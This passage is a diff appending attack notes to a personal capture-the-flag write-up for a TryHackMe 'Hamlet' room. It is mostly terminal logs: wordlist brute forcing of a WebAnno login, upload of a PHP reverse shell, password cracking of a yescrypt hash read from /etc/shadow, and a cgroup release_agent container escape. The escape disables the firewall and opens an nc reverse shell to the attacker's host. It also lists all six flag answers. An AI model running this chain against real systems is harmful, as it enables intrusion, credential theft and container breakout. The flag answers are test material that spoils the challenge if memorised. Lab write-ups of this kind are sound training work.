@@ -378,3 +378,383 @@ Gallows
 Bugges and Go
 PENTESTER
 gallows
+THM{2_ophelia_s_grave}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cewl -m 12 --lowercase -w hamlet_pass http://10.10.44.208/hamlet.txt
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wc -l hamlet_pass 
+75 hamlet_pass
+
+another way
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cewl http://10.10.44.208/hamlet.txt --lowercase | awk 'length($0)>=12 && length($0)<=14' | uniq > wordlist_hamlet.txt
+                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wc -l wordlist_hamlet.txt 
+74 wordlist_hamlet.txt
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ awk '{ print length($0) }' wordlist_hamlet.txt 
+13
+12
+14
+
+using burp intruder
+
+urlfragment=&username=ghost+&password=§test§
+
+urlfragment=&username=ghost+&password=vnsanctified (302 status)
+
+<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
+
+"/repository/project/" webanno
+
+documentUri="file:/srv/inception/_repository/project_/14/document/6929/source/example_txt.txt" 
+
+http://10.10.44.208:8080/users.html?18
+
+users: admin ghost and ophelia
+
+change ophelia's pass
+
+see annotations 
+
+http://10.10.44.208:8080/annotation.html?4#!p=0&d=0&f=1
+
+KEQehFDWwuQbMbKW
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ftp 10.10.44.208
+Connected to 10.10.44.208.
+220 (vsFTPd 3.0.3)
+Name (10.10.44.208:witty): ophelia
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||50927|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 Sep 15  2021 .
+drwxr-xr-x    5 0        0            4096 Sep 15  2021 ..
+-rw-r--r--    1 1001     1001           31 Sep 16  2021 flag
+226 Directory send OK.
+ftp> more flag
+THM{3_i_was_the_more_deceived}
+
+revshell
+
+http://10.10.44.208:8080/projectsetting.html?4
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail payload_ivan.php        
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1337);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>   
+
+import it
+
+/repository/project/<project_id>/document/<document_id>/source/<filename>
+
+in our case will be document_id 1 cz hamlet.txt is 0
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl http://10.10.44.208:8000/repository/project/0/document/1/source/payload_ivan.php
+
+┌──(witty㉿kali)-[~]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.44.208] 50236
+SOCKET: Shell has connected! PID: 24
+python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+sh: 1: python3: not found
+sh: 1: python: not found
+www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ ls
+<www/html/repository/project/0/document/1/source$ ls                        
+payload_ivan.php
+
+www-data@66505608bd11:/var/www/html/repository/project/0/document/0$ ls -lah /
+<www/html/repository/project/0/document/0$ ls -lah /                 
+total 88K
+drwxr-xr-x   1 root root 4.0K Sep 15  2021 .
+drwxr-xr-x   1 root root 4.0K Sep 15  2021 ..
+-rwxr-xr-x   1 root root    0 Sep 15  2021 .dockerenv
+drwxr-xr-x   1 root root 4.0K Sep  3  2021 bin
+drwxr-xr-x   2 root root 4.0K Apr 10  2021 boot
+drwxr-xr-x  13 root root 3.5K Aug  5 00:29 dev
+drwxr-xr-x   1 root root 4.0K Sep 15  2021 etc
+drwxr-xr-x   2 root root 4.0K Apr 10  2021 home
+drwxr-xr-x   1 root root 4.0K Sep  3  2021 lib
+drwxr-xr-x   2 root root 4.0K Sep  2  2021 lib64
+drwxr-xr-x   2 root root 4.0K Sep  2  2021 media
+drwxr-xr-x   2 root root 4.0K Sep  2  2021 mnt
+drwxr-xr-x   2 root root 4.0K Sep  2  2021 opt
+dr-xr-xr-x 119 root root    0 Aug  5 00:29 proc
+drwx------   1 root root 4.0K Sep 15  2021 root
+drwxr-xr-x   1 root root 4.0K Sep  3  2021 run
+drwxr-xr-x   1 root root 4.0K Sep  3  2021 sbin
+drwxr-xr-x   2 root root 4.0K Sep  2  2021 srv
+drwxr-xr-x   2 root root 4.0K Sep 15  2021 stage
+dr-xr-xr-x  13 root root    0 Aug  5 00:29 sys
+drwxrwxrwt   1 root root 4.0K Sep  3  2021 tmp
+drwxr-xr-x   1 root root 4.0K Sep  2  2021 usr
+drwxr-xr-x   1 root root 4.0K Sep  3  2021 var
+
+www-data@66505608bd11:/stage$ cat flag
+cat flag
+THM{4_the_murder_of_gonzago}
+
+www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;                        
+-rwsr-xr-x 1 root root 35040 Jul 28  2021 /bin/umount
+-rwsr-xr-x 1 root root 55528 Jul 28  2021 /bin/mount
+-rwsr-xr-x 1 root root 43936 Sep 24  2020 /bin/cat
+-rwsr-xr-x 1 root root 71912 Jul 28  2021 /bin/su
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+
+www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ cat /etc/shadow
+<sitory/project/0/document/1/source$ cat /etc/shadow                        
+root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7::
+
+└─$ hash-identifier
+   #########################################################################
+```
+```text
+#     __  __                     __           ______    _____           #
+```
+```text
+#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+```
+```text
+#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+```
+```text
+#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+```
+```text
+#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+```
+```text
+#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+```
+```text
+#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+```
+```text
+#                                                             By Zion3R #
+```
+```text
+#                                                    www.Blackploit.com #
+```
+
+## Exploitation
+```text
+#                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: $y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4
+
+ Not Found.
+--------------------------------------------------
+
+https://security.stackexchange.com/questions/248994/can-anyone-identify-the-y-hash-prefix-or-identify-what-hash-this-could-be
+
+So it turns out that it is a yescrypt hash and isn't supported by hashcat for cracking yet
+
+https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt
+
+--format=crypt
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash_hamlet 
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+murder           (?)     
+1g 0:00:00:54 DONE () 0.01832g/s 89.71p/s 89.71c/s 89.71C/s 2222222..asasas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+www-data@66505608bd11:/stage$ su root
+su root
+Password: murder
+
+root@66505608bd11:/stage# cd /root
+cd /root
+root@66505608bd11:~# ls -lah
+ls -lah
+total 20K
+drwx------ 1 root root 4.0K Sep 15  2021 .
+drwxr-xr-x 1 root root 4.0K Sep 15  2021 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+root@66505608bd11:~# cat .flag
+cat .flag
+THM{5_murder_most_foul}
+
+root@66505608bd11:~# fdisk
+fdisk
+bash: fdisk: command not found
+
+root@66505608bd11:~# ls -la /dev | grep disk
+ls -la /dev | grep disk
+crw-rw----  1 root disk     10, 234 Aug  5 00:29 btrfs-control
+brw-rw----  1 root disk    253,   0 Aug  5 00:29 dm-0
+crw-rw----  1 root disk     10, 237 Aug  5 00:29 loop-control
+brw-rw----  1 root disk      7,   0 Aug  5 00:29 loop0
+brw-rw----  1 root disk      7,   1 Aug  5 00:29 loop1
+brw-rw----  1 root disk      7,   2 Aug  5 00:29 loop2
+brw-rw----  1 root disk      7,   3 Aug  5 00:29 loop3
+brw-rw----  1 root disk      7,   4 Aug  5 00:29 loop4
+brw-rw----  1 root disk      7,   5 Aug  5 00:29 loop5
+brw-rw----  1 root disk      7,   6 Aug  5 00:29 loop6
+brw-rw----  1 root disk      7,   7 Aug  5 00:29 loop7
+brw-rw----  1 root disk    202,   0 Aug  5 00:29 xvda
+brw-rw----  1 root disk    202,   1 Aug  5 00:29 xvda1
+brw-rw----  1 root disk    202,   2 Aug  5 00:29 xvda2
+brw-rw----  1 root disk    202,   3 Aug  5 00:29 xvda3
+brw-rw----  1 root disk    202, 112 Aug  5 00:29 xvdh
+
+root@66505608bd11:~# mkdir -p /mnt/host
+mkdir -p /mnt/host
+root@66505608bd11:~# mount /dev/xvda2 /mnt/host
+mount /dev/xvda2 /mnt/host
+root@66505608bd11:~# cd /mnt/host
+cd /mnt/host
+root@66505608bd11:/mnt/host# ls
+ls
+System.map-4.15.0-156-generic  initrd.img-4.15.0-156-generic
+config-4.15.0-156-generic      lost+found
+grub			       vmlinuz-4.15.0-156-generic
+
+root@66505608bd11:/# mount /dev/dm-0 /mnt/host
+mount /dev/dm-0 /mnt/host
+root@66505608bd11:/# cd /mnt/host
+cd /mnt/host
+root@66505608bd11:/mnt/host# ls
+ls
+bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
+root@66505608bd11:/mnt/host# cd /root
+cd /root
+root@66505608bd11:~# ls
+ls
+root@66505608bd11:~# ls -lah
+ls -lah
+total 20K
+drwx------ 1 root root 4.0K Sep 15  2021 .
+drwxr-xr-x 1 root root 4.0K Aug  5 03:18 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+root@66505608bd11:~# cat .flag
+cat .flag
+THM{5_murder_most_foul}
+
+nope
+
+like you're in a cave but disabling ufw (scaping container)
+
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/bash' > /cmd
+echo "ufw --force disable" >> /cmd
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+root@66505608bd11:~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+<group -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+root@66505608bd11:~# echo 1 > /tmp/cgrp/x/notify_on_release
+echo 1 > /tmp/cgrp/x/notify_on_release
+root@66505608bd11:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+<h=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+root@66505608bd11:~# echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+root@66505608bd11:~# echo '#!/bin/bash' > /cmd
+echo '#!/bin/bash' > /cmd
+root@66505608bd11:~# echo "ufw --force disable" >> /cmd
+echo "ufw --force disable" >> /cmd
+root@66505608bd11:~# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
+<bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
+root@66505608bd11:~# chmod a+x /cmd
+chmod a+x /cmd
+root@66505608bd11:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338                                     
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.44.208] 45838
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+```text
+# cd /root
+```
+```text
+# ls -lah
+total 32K
+drwx------  5 root root 4.0K Sep 15  2021 .
+drwxr-xr-x 24 root root 4.0K Sep 15  2021 ..
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  2 root root 4.0K Sep 15  2021 .cache
+drwxr-xr-x  3 root root 4.0K Sep 15  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4.0K Sep 15  2021 .ssh
+-rw-r--r--  1 root root   55 Sep 16  2021 flag
+```
+```text
+# cat flag
+THM{6_though_this_be_madness_yet_there_is_method_in_t}
+```
+![[Pasted image 20230804211044.png]]
+![[Pasted image 20230804211657.png]]
+What is Michael's password?
+You will, most likely, create a wordlist and test against WebAnno.
+*vnsanctified*
+Flag 1
+Flag 2
+Flag 3
+Flag 4
+Flag 5
+Flag 6
+
+## Flags / Answers
+- There's a total of **six flags**. You don't necessarily have to find them in order. (**F****lags:** THM{#_flag})
+- ***THM{1_most_mechanical_and_dirty_hand}***
+- ***THM{2_ophelia_s_grave}***
+- ***THM{3_i_was_the_more_deceived}***
+- ***THM{4_the_murder_of_gonzago}***
+- ***THM{5_murder_most_foul}***
+- ***THM{6_though_this_be_madness_yet_there_is_method_in_t}***
+
+## Notes / Lessons Learned
+[[Forgotten Implant]]
+
